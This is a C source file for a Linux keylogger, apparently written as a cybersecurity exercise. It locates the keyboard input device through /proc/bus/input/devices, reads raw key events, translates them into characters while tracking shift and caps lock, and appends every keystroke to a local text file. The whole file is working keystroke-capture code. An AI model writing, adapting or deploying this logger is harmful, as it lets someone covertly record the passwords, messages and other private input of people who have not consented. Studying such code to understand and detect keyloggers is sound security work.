#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/carlos30/Escritorio/Ciberseguridad/keylogger.txt"

char *getEvent();
char mapKey(int code, int shiftPressed, int capsLockActive);

int main(){
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard)-1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard < 0) {
        perror("Error opening device");
        return 1;
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (!fp) {
        perror("Error opening log file");
        close(device_keyboard);
        return 1;
    }

    int shiftPressed = 0;
    int capsLockActive = 0;

    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY) {
            if (ev.value == 1) { // Key press
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                    shiftPressed = 1;
                }
                if (ev.code == KEY_CAPSLOCK) {
                    capsLockActive = !capsLockActive;
                }
            } else if (ev.value == 0) { // Key release
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                    shiftPressed = 0;
                }
                char key = mapKey(ev.code, shiftPressed, capsLockActive);
                if (key) {
                    fputc(key, fp);
                    fflush(fp);
                }
            }
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent(){
    static char event[8];
    FILE *pipe = popen("cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'", "r");
    if (!pipe)
        exit(1);

    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}

char mapKey(int code, int shiftPressed, int capsLockActive) {
    int shiftOrCaps = shiftPressed || capsLockActive;

    switch (code) {
        case KEY_A: return shiftOrCaps ? 'A' : 'a';
        case KEY_B: return shiftOrCaps ? 'B' : 'b';
        case KEY_C: return shiftOrCaps ? 'C' : 'c';
        case KEY_D: return shiftOrCaps ? 'D' : 'd';
        case KEY_E: return shiftOrCaps ? 'E' : 'e';
        case KEY_F: return shiftOrCaps ? 'F' : 'f';
        case KEY_G: return shiftOrCaps ? 'G' : 'g';
        case KEY_H: return shiftOrCaps ? 'H' : 'h';
        case KEY_I: return shiftOrCaps ? 'I' : 'i';
        case KEY_J: return shiftOrCaps ? 'J' : 'j';
        case KEY_K: return shiftOrCaps ? 'K' : 'k';
        case KEY_L: return shiftOrCaps ? 'L' : 'l';
        case KEY_M: return shiftOrCaps ? 'M' : 'm';
        case KEY_N: return shiftOrCaps ? 'N' : 'n';
        case KEY_O: return shiftOrCaps ? 'O' : 'o';
        case KEY_P: return shiftOrCaps ? 'P' : 'p';
        case KEY_Q: return shiftOrCaps ? 'Q' : 'q';
        case KEY_R: return shiftOrCaps ? 'R' : 'r';
        case KEY_S: return shiftOrCaps ? 'S' : 's';
        case KEY_T: return shiftOrCaps ? 'T' : 't';
        case KEY_U: return shiftOrCaps ? 'U' : 'u';
        case KEY_V: return shiftOrCaps ? 'V' : 'v';
        case KEY_W: return shiftOrCaps ? 'W' : 'w';
        case KEY_X: return shiftOrCaps ? 'X' : 'x';
        case KEY_Y: return shiftOrCaps ? 'Y' : 'y';
        case KEY_Z: return shiftOrCaps ? 'Z' : 'z';
        case KEY_1: return shiftPressed ? '!' : '1';
        case KEY_2: return shiftPressed ? '@' : '2';
        case KEY_3: return shiftPressed ? '#' : '3';
        case KEY_4: return shiftPressed ? '$' : '4';
        case KEY_5: return shiftPressed ? '%' : '5';
        case KEY_6: return shiftPressed ? '^' : '6';
        case KEY_7: return shiftPressed ? '&' : '7';
        case KEY_8: return shiftPressed ? '*' : '8';
        case KEY_9: return shiftPressed ? '(' : '9';
        case KEY_0: return shiftPressed ? ')' : '0';
        case KEY_SPACE: return ' ';
        case KEY_ENTER: return '\n';
        case KEY_BACKSPACE: return '\b';
        default: return 0;
    }
}
